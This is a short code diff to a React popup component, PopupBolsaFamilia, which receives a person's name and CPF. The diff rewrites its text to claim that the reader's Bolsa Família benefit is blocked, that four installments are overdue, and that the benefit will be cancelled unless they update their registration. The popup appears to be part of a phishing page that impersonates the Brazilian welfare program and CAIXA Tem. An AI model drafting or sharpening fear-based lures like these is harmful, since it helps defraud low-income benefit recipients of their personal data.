@@ -53,13 +53,13 @@ export function PopupBolsaFamilia({ nome, cpf }: PopupBolsaFamiliaProps) {
 
         {/* Descrição */}
         <p className="text-[#666] text-center px-6 mb-4">
-          Para continuar recebendo o Bolsa Família normalmente você precisa atualizar seus dados no CAIXA Tem.
+          Seu benefício foi bloqueado e você precisa atualizar seus dados para liberar as parcelas do seu Bolsa Família.
         </p>
 
         {/* Aviso Importante */}
         <div className="mx-6 mb-4 bg-[#fff2f2] border border-[#ffe6e6] rounded-md p-3">
           <p className="text-[#e05252] text-center text-sm">
-            <span className="font-bold">AVISO IMPORTANTE:</span> Atualização cadastral obrigatória para manter o pagamento do Bolsa Família em dia.
+            <span className="font-bold">AVISO IMPORTANTE:</span> Você possui 4 parcelas atrasadas que não recebeu! É necessário ATUALIZAR SEU CADASTRO para receber as parcelas, caso contrário, seu benefício será cancelado!
           </p>
         </div>
 
